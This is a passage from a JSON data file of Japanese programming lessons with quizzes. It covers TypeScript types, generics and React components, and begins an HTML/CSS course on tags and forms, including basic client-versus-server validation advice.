        "question": "interface は実行時（JavaScript になったあと）どうなる？",
        "choices": [
         "クラスとして残る",
         "消える（型チェック専用）"
        ],
        "answer": 1,
        "explain": "型の情報はコンパイル時に取り除かれます。"
       }
      ]
     ],
     "id": "03-interface-type"
    },
    {
     "title": "ユニオン型と型の絞り込み",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "type_hints",
      "conditionals"
     ],
     "summary": "「A または B」を表す `|` と、if で型を確定させる書き方。",
     "body": "## このレッスンのゴール\n\n- `string | number` や `\"a\" | \"b\"` を読める\n- `typeof` や `in`、`if` で型が絞り込まれる仕組みを説明できる\n\n## ユニオン型：A または B\n\n```typescript\nlet id: string | number;\nid = 101;      // OK\nid = \"A-101\";  // OK\nid = true;     // エラー\n```\n\nPython の `str | int` と同じです。\n\n## リテラル型：決まった値だけ\n\n```typescript\ntype Status = \"loading\" | \"success\" | \"error\";\nlet status: Status = \"loading\";\nstatus = \"done\";   // エラー：その文字列は許されていない\n```\n\n**選択肢を型で決めてしまう** 書き方で、AI のコードで非常によく出てきます。\nタイプミス（`\"sucess\"` など）を実行前に見つけられるのが利点です。\n\n## 絞り込み（ナローイング）\n\nユニオン型の値は、そのままでは「どちらか分からない」ので使える操作が限られます。\n`if` で調べると、その中では型が確定します。\n\n```typescript\nfunction format(id: string | number): string {\n  if (typeof id === \"number\") {\n    return id.toFixed(0);       // ここでは id は number\n  }\n  return id.toUpperCase();      // ここでは id は string\n}\n```\n\n| 調べ方 | 例 |\n|---|---|\n| `typeof x === \"string\"` | 基本の型を調べる |\n| `x === null` / `if (x)` | null・undefined を除く |\n| `\"email\" in user` | そのキーを持っているか |\n| `x instanceof Date` | どのクラスのインスタンスか |\n| `Array.isArray(x)` | 配列か |\n\n## 判別可能なユニオン（AI がよく書く形）\n\n```typescript\ntype Result =\n  | { ok: true; data: string[] }\n  | { ok: false; error: string };\n\nfunction show(r: Result) {\n  if (r.ok) {\n    console.log(r.data);    // ok が true の形 → data がある\n  } else {\n    console.log(r.error);   // ok が false の形 → error がある\n  }\n}\n```\n\n共通のキー（ここでは `ok`、よく `type` や `kind`）で形を見分けます。\n`switch (action.type) { case \"add\": ... }` の形も同じ考え方で、React の状態管理などで頻出です。\n\n## ! と as（要注意の書き方）\n\n```typescript\nconst el = document.getElementById(\"app\")!;   // 「絶対に null じゃない」と言い切る\nconst user = data as User;                     // 「これは User だ」と言い切る\n```\n\nどちらも **TypeScript のチェックを人間の判断で黙らせる** 書き方です。間違っていると実行時にエラーになります。\nAI のコードで多用されていたら、「本当にそう言い切れる？」とチェックしたいポイントです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`type Size = \"S\" | \"M\" | \"L\"` の変数に入れられないのは？",
        "choices": [
         "\"S\"",
         "\"L\"",
         "\"XL\""
        ],
        "answer": 2,
        "explain": "リテラル型で決めた 3 つ以外は入れられません。"
       },
       {
        "question": "`if (typeof v === \"string\") { ... }` の { } の中で v の型は？",
        "choices": [
         "string",
         "string | number のまま",
         "unknown"
        ],
        "answer": 0,
        "explain": "typeof のチェックで型が絞り込まれます。"
       },
       {
        "question": "`value as User` の注意点は？",
        "choices": [
         "TypeScript のチェックを省略するので、実際に違う形ならバグになる",
         "値が自動的に User に変換される",
         "実行が遅くなる"
        ],
        "answer": 0,
        "explain": "as は変換ではなく「そうだと信じて」という宣言です。"
       }
      ]
     ],
     "id": "04-union-narrowing"
    },
    {
     "title": "関数の型と Promise の型",
     "level": 2,
     "minutes": 12,
     "concepts": [
      "type_hints",
      "functions",
      "async",
      "higher_order"
     ],
     "summary": "コールバックの型、`Promise<T>`、API 呼び出しの型付けを読む。",
     "body": "## このレッスンのゴール\n\n- `(x: number) => string` という「関数の型」を読める\n- `async` 関数の戻り値 `Promise<User[]>` の意味が分かる\n\n## 関数そのものの型\n\n```typescript\ntype Formatter = (value: number) => string;\n\nconst yen: Formatter = (v) => `${v.toLocaleString()} 円`;\n\nfunction printAll(values: number[], format: Formatter): void {\n  values.forEach((v) => console.log(format(v)));\n}\n```\n\n`(value: number) => string` は「number を受け取って string を返す関数」という **型** です。\nアロー関数と見た目が似ていますが、`=>` の右が **値ではなく型** になっている点に注意しましょう。\nPython の `Callable[[int], str]` にあたります。\n\n## オプション引数・デフォルト引数\n\n```typescript\nfunction greet(name: string, greeting?: string): string { ... }      // 省略可\nfunction greet2(name: string, greeting = \"こんにちは\"): string { ... } // 既定値（型は推論）\n```\n\n## async 関数と Promise<T>\n\n```typescript\ninterface User { id: number; name: string; }\n\nasync function fetchUsers(): Promise<User[]> {\n  const res = await fetch(\"/api/users\");\n  if (!res.ok) throw new Error(`HTTP ${res.status}`);\n  return (await res.json()) as User[];\n}\n```\n\n`Promise<User[]>` は「**あとで User の配列が届く約束**」という型です。\n`async` 関数の戻り値は必ず `Promise<...>` になり、`await` すると中身（`User[]`）が取り出せます。\n\n```typescript\nconst users = await fetchUsers();   // users の型は User[]\nconst p = fetchUsers();             // p の型は Promise<User[]>（await 忘れに気づける）\n```\n\n## ⚠️ res.json() の結果は信用できない\n\n`res.json()` の戻り値は `any`（または `unknown`）です。上の `as User[]` は「そうだと信じる」だけで、\nサーバーが違う形のデータを返しても TypeScript は気づけません。\nしっかりしたコードでは **zod** などのライブラリで実際の中身を検証します。\n\n```typescript\nimport { z } from \"zod\";\nconst UserSchema = z.object({ id: z.number(), name: z.string() });\nconst users = z.array(UserSchema).parse(await res.json());   // 形が違えばここでエラー\n```\n\nAI のコードで `zod` や `z.object` を見たら「外から来たデータを検証している」と読みましょう。\nPython の pydantic と同じ役割です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`type F = (s: string) => boolean` に合う関数は？",
        "choices": [
         "(s) => s.length > 0",
         "(n: number) => n > 0",
         "(s) => s.toUpperCase()"
        ],
        "answer": 0,
        "explain": "string を受け取り boolean を返す関数です。"
       },
       {
        "question": "`async function f(): Promise<number>` を `const x = await f()` で呼ぶと x の型は？",
        "choices": [
         "Promise<number>",
         "number"
        ],
        "answer": 1,
        "explain": "await すると Promise の中身が取り出せます。"
       },
       {
        "question": "`(await res.json()) as User[]` の弱点は？",
        "choices": [
         "実際のデータが User[] の形か、実行時には確認していない",
         "必ずエラーになる",
         "型が any になる"
        ],
        "answer": 0,
        "explain": "実行時の検証には zod などを使います。"
       }
      ]
     ],
     "id": "05-function-types-async"
    },
    {
     "title": "ジェネリクス",
     "level": 3,
     "minutes": 15,
     "concepts": [
      "generics",
      "type_hints"
     ],
     "summary": "`<T>` の読み方。型を「引数」のように受け取る仕組み。",
     "body": "## このレッスンのゴール\n\n- `<T>` が「型の引数（あとで決まる型）」だと説明できる\n- `Array<T>`、`Promise<T>`、`useState<T>` などの読み方が分かる\n\n## なぜ必要？\n\n「配列の最初の要素を返す関数」を考えます。\n\n```typescript\nfunction firstNumber(items: number[]): number { return items[0]; }\nfunction firstString(items: string[]): string { return items[0]; }\n```\n\n中身は同じなのに、型ごとに関数を作るのは無駄です。`any` を使うと型の情報が消えてしまいます。\n\n## <T> ＝ 型の引数\n\n```typescript\nfunction first<T>(items: T[]): T {\n  return items[0];\n}\n\nconst n = first([1, 2, 3]);        // T は number → n は number\nconst s = first([\"a\", \"b\"]);       // T は string → s は string\nconst u = first<User>(users);      // 明示的に指定することもできる\n```\n\n**`T` は「呼ばれたときに決まる型」の仮の名前** です。\n`first<T>(items: T[]): T` は「何かの型 T の配列を受け取り、同じ T を返す」と読みます。\n`T` 以外に `K`（キー）、`V`（値）、`TData` など意味のある名前が使われることもあります。\n\n## もう出会っているジェネリクス\n\n| 書き方 | 読み方 |\n|---|---|\n| `Array<string>` | string の配列 |\n| `Promise<User>` | あとで User が届く約束 |\n| `Record<string, number>` | キーが string・値が number の辞書 |\n| `Map<string, User>` | string → User の Map |\n| `useState<number>(0)` | number を持つ状態（React） |\n\n`<...>` を見たら「**中に入る型を指定している**」と読めば OK です。\n\n## 制約：extends\n\n```typescript\nfunction getLength<T extends { length: number }>(x: T): number {\n  return x.length;\n}\ngetLength(\"hello\");   // OK（string は length を持つ）\ngetLength([1, 2]);    // OK\ngetLength(42);        // エラー（number は length を持たない）\n```\n\n`T extends ...` は「T は何でもいいわけではなく、**この条件を満たす型** に限る」という意味です。\n\n## interface にも使える\n\n```typescript\ninterface ApiResponse<T> {\n  data: T;\n  error: string | null;\n}\n\nconst res: ApiResponse<User[]> = { data: [], error: null };\n```\n\nAPI の返り値の「外枠は共通、中身だけ違う」という形でよく使われます。\n\n## Python では\n\n```python\ndef first[T](items: list[T]) -> T:   # Python 3.12 以降の書き方\n    return items[0]\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`function wrap<T>(x: T): T[]` を `wrap(\"a\")` で呼ぶと戻り値の型は？",
        "choices": [
         "string[]",
         "string",
         "T[]"
        ],
        "answer": 0,
        "explain": "T が string に決まるので T[] は string[] です。"
       },
       {
        "question": "`ApiResponse<Product>` の `data` の型は？",
        "choices": [
         "ApiResponse",
         "Product",
         "T"
        ],
        "answer": 1,
        "explain": "T に Product が入ります。"
       },
       {
        "question": "`<T extends { id: number }>` の意味は？",
        "choices": [
         "T は id: number を持つ型に限られる",
         "T は id という名前の型",
         "T を id に変換する"
        ],
        "answer": 0,
        "explain": "extends はジェネリクスでは「制約」の意味です。"
       }
      ]
     ],
     "id": "06-generics"
    },
    {
     "title": "ユーティリティ型",
     "level": 3,
     "minutes": 12,
     "concepts": [
      "generics",
      "type_hints"
     ],
     "summary": "Partial・Pick・Omit・keyof など、既存の型から新しい型を作る道具。",
     "body": "## このレッスンのゴール\n\n- `Partial` / `Pick` / `Omit` / `Required` の意味が分かる\n- `keyof` と `typeof` を読める\n\n## 既存の型から作る\n\n```typescript\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n  password: string;\n}\n```\n\nこの `User` をもとに、場面ごとの型を作れます。\n\n| 書き方 | 意味 | 使われる場面 |\n|---|---|---|\n| `Partial<User>` | すべての項目を省略可能に | 一部だけ更新するとき |\n| `Required<User>` | すべての項目を必須に | |\n| `Pick<User, \"id\" \\| \"name\">` | 指定した項目だけ | 一覧表示用 |\n| `Omit<User, \"password\">` | 指定した項目を除く | 外に返すとき（秘密を除く） |\n| `Readonly<User>` | すべて書き換え禁止 | |\n\n```typescript\nfunction updateUser(id: number, changes: Partial<User>) { ... }\nupdateUser(1, { name: \"新しい名前\" });   // 一部だけでも OK\n\ntype PublicUser = Omit<User, \"password\">;   // パスワードを外に出さない型\n```\n\n`Omit<User, \"password\">` のような型は、**セキュリティの意図が型に表れている** 例です。\n\n## keyof：キーの一覧を型にする\n\n```typescript\ntype UserKey = keyof User;   // \"id\" | \"name\" | \"email\" | \"password\"\n\nfunction getField(user: User, key: keyof User) {\n  return user[key];\n}\ngetField(u, \"name\");   // OK\ngetField(u, \"nmae\");   // エラー（タイプミスを防げる）\n```\n\n## typeof：値から型を作る\n\n```typescript\nconst defaultConfig = { theme: \"dark\", fontSize: 14 };\ntype Config = typeof defaultConfig;   // { theme: string; fontSize: number }\n```\n\nJavaScript の `typeof x === \"string\"`（実行時の判定）とは別物で、\n**型の位置に書かれた `typeof` は「この値の型」** という意味です。\n\n## as const\n\n```typescript\nconst COLORS = [\"red\", \"green\", \"blue\"] as const;\ntype Color = (typeof COLORS)[number];   // \"red\" | \"green\" | \"blue\"\n```\n\n`as const` は「この値を変更しない。型もリテラルのまま扱って」という指定です。\n選択肢の一覧から型を作るテクニックで、AI のコードでときどき見かけます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`Omit<User, \"password\">` の型が持たない項目は？",
        "choices": [
         "id",
         "name",
         "password"
        ],
        "answer": 2,
        "explain": "Omit は指定した項目を取り除きます。"
       },
       {
        "question": "`Partial<Product>` の変数に `{}`（空オブジェクト）を入れられる？",
        "choices": [
         "入れられる",
         "入れられない"
        ],
        "answer": 0,
        "explain": "Partial はすべての項目を省略可能にします。"
       },
       {
        "question": "`keyof { a: number; b: string }` は？",
        "choices": [
         "\"a\" | \"b\"",
         "number | string",
         "{ a: number; b: string }"
        ],
        "answer": 0,
        "explain": "keyof はキー名のユニオン型を作ります。"
       }
      ]
     ],
     "id": "07-utility-types"
    },
    {
     "title": "React コンポーネントを読む（TSX）",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "dom_ui",
      "type_hints",
      "functions",
      "generics"
     ],
     "summary": "AI が最もよく書く TypeScript の形、React の .tsx ファイルを読み解く。",
     "body": "## このレッスンのゴール\n\n- JSX（HTML のような部分）が「画面の設計図を返している」と説明できる\n- Props の型、`useState`、`useEffect` の役割を読める\n\n## コンポーネント＝画面の部品を返す関数\n\n```tsx\ntype GreetingProps = {\n  name: string;\n  count?: number;\n};\n\nexport function Greeting({ name, count = 0 }: GreetingProps) {\n  return (\n    <div className=\"greeting\">\n      <h1>こんにちは、{name}さん</h1>\n      {count > 0 && <p>{count} 件の通知があります</p>}\n    </div>\n  );\n}\n```\n\n| 部分 | 読み方 |\n|---|---|\n| `GreetingProps` | この部品が受け取るデータ（**Props**）の型 |\n| `({ name, count = 0 }: GreetingProps)` | Props を分割代入で受け取る（JS コースの「分割代入」） |\n| `return ( <div>...</div> )` | 画面の設計図（**JSX**）を返す |\n| `{name}` | JSX の中の `{ }` は JavaScript の式（f-string の `{ }` と同じ感覚） |\n| `className` | HTML の `class`（JS の予約語と被るので名前が違う） |\n| `{条件 && <p>...</p>}` | 条件が真のときだけ表示する定番の書き方 |\n\n使う側は HTML のタグのように書きます：`<Greeting name=\"Ryo\" count={3} />`\n\n## useState：変化するデータ（状態）\n\n```tsx\nimport { useState } from \"react\";\n\nexport function Counter() {\n  const [count, setCount] = useState<number>(0);\n\n  return (\n    <button onClick={() => setCount(count + 1)}>\n      {count} 回押された\n    </button>\n  );\n}\n```\n\n- `useState<number>(0)`：初期値 0 の **状態** を作る（`<number>` はジェネリクス）\n- `[count, setCount]`：今の値と、値を変える関数（配列の分割代入）\n- `setCount(...)` を呼ぶと、**React が自動で画面を描き直す**\n\nDOM を直接書き換えた JavaScript コースとの一番の違いはここです。\n**「状態を変える → 画面は React が勝手に更新」** と読みましょう。\n\n## リストを表示する：map\n\n```tsx\ntype Todo = { id: number; title: string; done: boolean };\n\nfunction TodoList({ todos }: { todos: Todo[] }) {\n  return (\n    <ul>\n      {todos.map((todo) => (\n        <li key={todo.id}>{todo.done ? \"✅\" : \"⬜\"} {todo.title}</li>\n      ))}\n    </ul>\n  );\n}\n```\n\n配列の `map` で `<li>` を量産しています。`key` は React が要素を見分けるための目印です。\n\n## useEffect：表示されたあとに何かする\n\n```tsx\nconst [users, setUsers] = useState<User[]>([]);\n\nuseEffect(() => {\n  fetchUsers().then(setUsers);\n}, []);   // [] ＝ 最初の 1 回だけ実行\n```\n\n「画面が表示されたら API からデータを取ってきて、状態に入れる」という定番の形です。\n最後の `[]` は **いつ実行し直すか**（依存配列）。`[userId]` なら userId が変わるたびに実行されます。\n\n## 読む順番のコツ\n\n1. Props の型（何を受け取る部品か）\n2. `useState`（どんなデータが変化するか）\n3. `return` の JSX（画面の形）\n4. イベント（`onClick` など）と `useEffect`（いつ何が起きるか）\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`<UserCard user={u} />` と書いたとき、UserCard 関数が受け取るのは？",
        "choices": [
         "{ user: u } という Props",
         "u そのもの",
         "何も受け取らない"
        ],
        "answer": 0,
        "explain": "属性がまとめて Props オブジェクトとして渡されます。"
       },
       {
        "question": "`setCount(5)` を呼ぶと何が起きる？",
        "choices": [
         "count が 5 になり、React が画面を描き直す",
         "count が 5 になるが画面はそのまま",
         "DOM を自分で書き換える必要がある"
        ],
        "answer": 0,
        "explain": "状態を変えると React が自動で再描画します。"
       },
       {
        "question": "`useEffect(() => { ... }, [])` の中身はいつ実行される？",
        "choices": [
         "部品が最初に表示されたときの 1 回",
         "画面が描き直されるたび毎回",
         "ボタンが押されたとき"
        ],
        "answer": 0,
        "explain": "依存配列が空なので最初の 1 回だけです。"
       },
       {
        "question": "JSX の `{isAdmin && <AdminMenu />}` の意味は？",
        "choices": [
         "isAdmin が真のときだけ AdminMenu を表示",
         "isAdmin と AdminMenu を両方表示",
         "isAdmin に AdminMenu を代入"
        ],
        "answer": 0,
        "explain": "&& による条件付き表示の定番パターンです。"
       }
      ]
     ],
     "id": "08-react-components"
    }
   ],
   "status": "open"
  },
  {
   "title": "HTML / CSS",
   "icon": "🎨",
   "order": 40,
   "description": "Web ページの骨組み（HTML）と見た目（CSS）。タグ・フォーム・セレクタとカスケード・ボックスモデル・Flexbox と Grid・レスポンシブ、AI がよく使う Tailwind CSS の読み方まで。値はすべて実際のブラウザで確かめたもの。",
   "levels": {
    "1": "入門：骨組みと見た目",
    "2": "基礎：レイアウト",
    "3": "実践：AI のコードを読む"
   },
   "id": "40-html-css",
   "lessons": [
    {
     "title": "HTML のタグと要素 ― ページの骨組み",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "dom_ui",
      "basics",
      "reading"
     ],
     "summary": "HTML はタグで「これは見出し」「これは段落」と意味を付ける言語。ページの基本の形、よく使うタグ、属性、入れ子、意味のあるタグ（セマンティック）の読み方。",
     "body": "## このレッスンのゴール\n\n- HTML の基本の形（`<!doctype html>`・`head`・`body`）を読める\n- タグ・要素・属性という言葉を使い分けられる\n- よく使うタグが何を表すか分かり、`div` だらけのコードとの違いが説明できる\n\n## HTML は「意味の札」を付ける言語\n\nHTML は、文章のあちこちに **タグ** という札を付けて、「ここは見出し」「ここは段落」「ここはリンク」と **意味（役割）** を伝える言語です。プログラミング言語のように計算はしません。\n\n```html\n<h1>買い物メモ</h1>\n<p>今日買うものです。</p>\n```\n\n| 用語 | 例 | 意味 |\n|---|---|---|\n| **開始タグ** | `<p>` | ここから |\n| **終了タグ** | `</p>` | ここまで（`/` が付く） |\n| **要素** | `<p>今日買うものです。</p>` | 開始タグから終了タグまでのひとまとまり |\n| **中身** | `今日買うものです。` | 要素の中の文字や、別の要素 |\n\nPython で言うと、HTML は **入れ子になった辞書やリスト** のようなものです。「ページ」の中に「本文」があり、その中に「見出し」と「段落」がある、という **木の形** になっています。JavaScript コースの「DOM とイベント」で、ブラウザがこの木を DOM として扱うことを学びました。\n\n## ページの基本の形\n\n```html\n<!doctype html>\n<html lang=\"ja\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>買い物メモ</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n  </head>\n  <body>\n    <h1>買い物メモ</h1>\n    <p>今日買うものです。</p>\n    <script src=\"app.js\"></script>\n  </body>\n</html>\n```\n\n| 部分 | 意味 |\n|---|---|\n| `<!doctype html>` | 「今の HTML の書き方です」という宣言。いつも 1 行目 |\n| `<html lang=\"ja\">` | 全体を包む。`lang=\"ja\"` は日本語のページという意味（読み上げや翻訳に使われる） |\n| `<head>` | **画面に出ない情報**：文字コード・タイトル・CSS の読み込み |\n| `<meta charset=\"utf-8\">` | 文字コードは UTF-8（コンピュータの基礎コースの「文字コード」） |\n| `<meta name=\"viewport\" ...>` | スマホで正しい幅で表示する（レッスン 6） |\n| `<title>` | ブラウザのタブに出る名前 |\n| `<link rel=\"stylesheet\">` | CSS のファイルを読み込む |\n| `<body>` | **画面に出る中身** |\n| `<script src=\"...\">` | JavaScript を読み込む。`body` の最後に置くと、HTML を全部読んでから動く |\n\nこのサイトの `site/index.html` も、ほぼこの形です。開いて見比べてみましょう。\n\n## よく使うタグ\n\n### 文章の構造\n\n| タグ | 意味 |\n|---|---|\n| `<h1>`〜`<h6>` | 見出し。`h1` がいちばん大きい（ページに 1 つが目安） |\n| `<p>` | 段落 |\n| `<ul>` / `<ol>` + `<li>` | 箇条書き（`ul` は点、`ol` は番号） |\n| `<a href=\"URL\">` | リンク |\n| `<img src=\"画像\" alt=\"説明\">` | 画像（終了タグが無い） |\n| `<strong>` / `<em>` | 強調 |\n| `<br>` | 改行（終了タグが無い） |\n| `<table>` `<tr>` `<th>` `<td>` | 表（行・見出しのマス・普通のマス） |\n\n```html\n<ul>\n  <li>りんご</li>\n  <li>牛乳</li>\n</ul>\n```\n\n`<img>` や `<br>`、`<meta>` のように、**中身を持たないタグ** は終了タグを書きません（`<br />` と書くこともあります）。\n\n### 意味のある入れ物（セマンティックタグ）\n\n| タグ | 意味 |\n|---|---|\n| `<header>` | ページや区切りの頭（ロゴ・メニュー） |\n| `<nav>` | メニュー（ナビゲーション） |\n| `<main>` | ページの主な中身（1 つだけ） |\n| `<section>` / `<article>` | 内容のまとまり／それだけで完結する記事 |\n| `<footer>` | ページや区切りの終わり（著作権表示など） |\n| `<div>` | **意味の無い** 入れ物。見た目を整えるためだけに使う |\n| `<span>` | 文の途中の、意味の無い入れ物 |\n\n```html\n<!-- ⚠️ 全部 div -->\n<div class=\"header\"><div class=\"nav\">...</div></div>\n<div class=\"main\">...</div>\n\n<!-- ✅ 意味のあるタグ -->\n<header><nav>...</nav></header>\n<main>...</main>\n```\n\n見た目は同じにできますが、意味のあるタグを使うと、**画面の読み上げソフト**（目の不自由な人が使う）や **検索エンジン** が、ページの作りを正しく理解できます。\n\n## 属性：タグに付ける追加の情報\n\n```html\n<a href=\"https://example.com\" target=\"_blank\" rel=\"noopener\">サイトへ</a>\n<img src=\"cat.jpg\" alt=\"窓辺で寝ている猫\" width=\"300\">\n<p id=\"intro\" class=\"note important\">はじめに</p>\n```\n\n`名前=\"値\"` の形で、開始タグの中に書きます。Python の関数のキーワード引数（`f(href=\"...\")`）に似ています。\n\n| 属性 | 意味 |\n|---|---|\n| `href` | リンク先 |\n| `target=\"_blank\"` | 新しいタブで開く |\n| `src` | 画像やスクリプトのファイルの場所 |\n| `alt` | 画像の説明。画像が出ないときや読み上げに使われる |\n| `id` | ページの中で 1 つだけの名前（レッスン 3） |\n| `class` | グループの名前。スペース区切りで複数付けられる（レッスン 3） |\n| `data-...` | 自由に付けてよい属性。JavaScript から読む（このサイトのクイズの `data-quiz` など） |\n\n## コメントと空白\n\n```html\n<!-- これはコメント。画面には出ない -->\n<p>改行や\n   スペースを   たくさん入れても</p>\n```\n\nHTML では、**改行や連続したスペースは 1 つの空白** として表示されます。改行したいときは段落を分けるか `<br>` を使います。\n\n⚠️ コメントは画面に出ませんが、**「ページのソースを表示」で誰でも見られます**。メモのつもりで秘密を書かないようにしましょう。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `<html>` に `lang` が無い／`<meta charset>` が無い | ⚠️ 読み上げや文字化けで困ることがある |\n| `<img src=\"...\">` に `alt` が無い | ⚠️ 画像の説明が無い。飾りだけの画像なら `alt=\"\"` |\n| 全部 `<div>` で、クリックできる場所も `<div onclick=...>` | ⚠️ キーボードで操作できない。ボタンは `<button>`（レッスン 2） |\n| `<h1>` の次がいきなり `<h4>` | 見出しは順番に（大きさは CSS で変える） |\n| `target=\"_blank\"` | 今のブラウザでは `rel=\"noopener\"` 相当が自動で付くが、古いコードでは付けておくのが定番 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`<p class=\"note\">今日買うもの</p>` のうち、「属性」はどれ？",
        "choices": [
         "`<p>`",
         "`class=\"note\"`",
         "`今日買うもの`"
        ],
        "answer": 1,
        "explain": "属性は開始タグの中に `名前=\"値\"` で書く追加の情報です。`<p>...</p>` 全体が要素、`今日買うもの` は中身です。"
       },
       {
        "question": "`<head>` の中に書くものとして正しいのは？",
        "choices": [
         "文字コードの指定やタイトル、CSS の読み込みなど、画面に直接出ない情報",
         "ページの本文",
         "画像やボタン"
        ],
        "answer": 0,
        "explain": "画面に出る中身は `<body>` に、ページについての情報は `<head>` に書きます。"
       },
       {
        "question": "`<div class=\"nav\">` の代わりに `<nav>` を使う利点は？",
        "choices": [
         "表示が速くなる",
         "CSS が不要になる",
         "読み上げソフトや検索エンジンに「ここはメニュー」という意味が伝わる"
        ],
        "answer": 2,
        "explain": "見た目は同じにできますが、意味のあるタグはページの作りを機械に伝えられます。"
       }
      ]
     ],
     "id": "01-tags-elements"
    },
    {
     "title": "フォームとボタン ― 入力を受け取る",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "dom_ui",
      "http_api",
      "security"
     ],
     "summary": "form・input・label・button の読み方。name 属性がサーバーに届く名前になること、button の初期値は「送信」であること、ブラウザのチェックだけでは守れないこと。",
     "body": "## このレッスンのゴール\n\n- フォームの部品（`form`・`input`・`label`・`button`）を読み、送信したときに何が届くか説明できる\n- `name` 属性と `id` 属性の違いが分かる\n- `<button>` が初期設定で「送信ボタン」になる落とし穴と、`required` などのチェックの限界が分かる\n\n## フォームの基本\n\n```html\n<form action=\"/signup\" method=\"post\">\n  <label for=\"email\">メールアドレス</label>\n  <input id=\"email\" name=\"email\" type=\"email\" required>\n\n  <label for=\"age\">年齢</label>\n  <input id=\"age\" name=\"age\" type=\"number\" min=\"0\" max=\"120\">\n\n  <label>\n    <input name=\"news\" type=\"checkbox\" value=\"yes\"> お知らせを受け取る\n  </label>\n\n  <button type=\"submit\">登録</button>\n</form>\n```\n\n| 部分 | 意味 |\n|---|---|\n| `<form action=\"/signup\" method=\"post\">` | 送信ボタンを押すと、`/signup` に POST で送る（バックエンドコースの「HTTP」） |\n| `name=\"email\"` | **サーバーに届くときの名前**。`email=ryo@example.com` の形で送られる |\n| `id=\"email\"` | ページの中での名前。`<label for=\"email\">` と結び付けるのに使う |\n| `type=\"email\"` | 入力の種類。スマホではメール用のキーボードが出る |\n| `required` | 空のままでは送信させない |\n| `min` / `max` | 数値の範囲 |\n\n送信すると、サーバーにはこんな内容が届きます（バックエンドコースの「HTTP」のボディ）。\n\n```text\nemail=ryo%40example.com&age=30&news=yes\n```\n\n`@` が `%40` になっているのは、URL の中で特別な意味を持つ記号を、別の書き方にしているためです。チェックを外したチェックボックスは、**何も送られません**。\n\nFastAPI で受け取るなら、`name` と同じ名前の引数で受け取ります。\n\n```python\n@app.post(\"/signup\")\ndef signup(email: str = Form(), age: int | None = Form(None), news: str | None = Form(None)):\n    ...\n```\n\n⚠️ `name` を付け忘れると、その入力は **送信されません**。画面には出ているのにサーバーに届かない、というよくある原因です。\n\n## input の種類\n\n| `type` | 見た目・動き |\n|---|---|\n| `text` | 1 行の文字（初期値） |\n| `email` / `url` / `tel` | 形のチェック・スマホのキーボードが変わる |\n| `password` | 入力が `●●●` で隠れる |\n| `number` | 数値。上下の矢印 |\n| `date` / `time` | カレンダーなどで選べる |\n| `checkbox` | 複数選べる四角 |\n| `radio` | 1 つだけ選べる丸（同じ `name` のものから 1 つ） |\n| `file` | ファイルを選ぶ（`<form enctype=\"multipart/form-data\">` が必要） |\n| `hidden` | 画面に出ないが送信される値 |\n\n複数行の文字は `<textarea>`、選択肢は `<select>` と `<option>` を使います。\n\n## label：何の入力欄かを結び付ける\n\n```html\n<label for=\"email\">メールアドレス</label>\n<input id=\"email\" ...>\n```\n\n`for` と `id` が同じだと、**文字をクリックしても入力欄が選ばれ**、読み上げソフトが「メールアドレス、入力欄」と読んでくれます。入力欄の中に薄く出る `placeholder=\"例: ryo@example.com\"` は、入力を始めると消えるので、**ラベルの代わりにはなりません**。\n\n## button の落とし穴\n\n```html\n<form>\n  <input name=\"q\">\n  <button>検索</button>             <!-- type を書かないと submit（送信）になる -->\n  <button type=\"button\">クリア</button>   <!-- 送信しない、ただのボタン -->\n</form>\n```\n\n**フォームの中の `<button>` は、`type` を書かないと送信ボタン** になります。「クリア」のつもりのボタンを押したらページが再読み込みされた、というのはよくあるバグです。\n\nJavaScript で送信を自分で処理するときは、こう書きます。\n\n```javascript\nform.addEventListener(\"submit\", (event) => {\n  event.preventDefault();          // ブラウザの普通の送信（ページの移動）を止める\n  const data = new FormData(form); // name ごとの値を取り出す\n  fetch(\"/api/signup\", { method: \"POST\", body: data });\n});\n```\n\nReact などの AI のコードで `e.preventDefault()` をよく見るのは、このためです。\n\n### クリックできるものは button か a に\n\n```html\n<div onclick=\"save()\">保存</div>              <!-- ⚠️ -->\n<button type=\"button\" onclick=\"save()\">保存</button>  <!-- ✅ -->\n```\n\n`<div>` は、マウスではクリックできても、**キーボード（Tab キーと Enter）では操作できません**。「押すと何かが起きる」ものは `<button>`、「別のページへ移る」ものは `<a href>` にします。\n\n## ブラウザのチェックは「親切」であって「守り」ではない\n\n`required`・`type=\"email\"`・`min`・`maxlength` は、利用者がうっかり間違えるのを防ぐ **親切** です。\nでも、ブラウザの開発者ツールで HTML を書き換えたり、フォームを使わずに直接リクエストを送ったりすれば、**簡単に飛ばせます**（セキュリティのコースのレッスン 1）。\n\n```text\nブラウザのチェック（required・type）  → 使いやすさのため\nサーバーのチェック（バリデーション）   → 守るため。必ず必要\n```\n\n`type=\"hidden\"` の値も、利用者が自由に書き換えられます。`<input type=\"hidden\" name=\"price\" value=\"1980\">` のように、**値段などをフォームから受け取ってはいけません**。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `<input>` に `name` が無い | ⚠️ 普通のフォーム送信では届かない（JavaScript で値を集めているなら別） |\n| `<input>` に `<label>` が無く、`placeholder` だけ | ⚠️ 入力を始めると何の欄か分からなくなる |\n| フォームの中の `<button>` に `type` が無い | クリアなどのボタンなら `type=\"button\"` が必要 |\n| `<div onclick>` / `<span onclick>` | ⚠️ キーボードで押せない。`<button>` に |\n| `type=\"hidden\" name=\"price\"` / `name=\"is_admin\"` | ⚠️ 書き換えられる。サーバー側で決める |\n| `method=\"get\"` でパスワードを送る | ⚠️ URL 